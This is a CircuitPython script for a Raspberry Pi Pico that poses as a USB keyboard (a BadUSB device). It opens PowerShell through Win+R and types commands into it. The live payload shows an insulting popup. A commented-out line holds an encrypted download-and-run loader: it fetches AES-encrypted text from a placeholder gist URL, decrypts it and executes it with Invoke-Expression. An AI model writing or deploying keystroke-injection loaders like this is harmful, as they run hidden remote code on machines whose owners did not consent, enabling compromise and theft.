import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode

# from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from keyboard_layout_jp import KeyboardLayoutJP

keyboard = Keyboard(usb_hid.devices)
keyboard_layout = KeyboardLayoutJP(keyboard)

# PCがPicoを認識するまで待機
time.sleep(4)

# PowerShellを起動
keyboard.send(Keycode.WINDOWS, Keycode.R)
time.sleep(0.5)
keyboard_layout.write("powershell\n")
time.sleep(2)

# script = '$uri = "https://gist.githubusercontent.com/xxx/xxx/raw/xxx/gistfile1.txt"; $key = [Convert]::FromBase64String("xxx"); $iv = [Convert]::FromBase64String("xxx"); $encryptedData = (New-Object Net.WebClient).DownloadString($uri); $encryptedBytes = [Convert]::FromBase64String($encryptedData); $aes = New-Object System.Security.Cryptography.AesManaged; $aes.Key = $key; $aes.IV = $iv; $plaintextBytes = $aes.CreateDecryptor().TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length); $script = [System.Text.Encoding]::UTF8.GetString($plaintextBytes); Invoke-Expression $script\n'
script = '$wsobj = new-object -comobject wscript.shell;$result = $wsobj.popup("You are an idiot!");'
keyboard_layout.write(script)
keyboard.send(Keycode.ENTER)
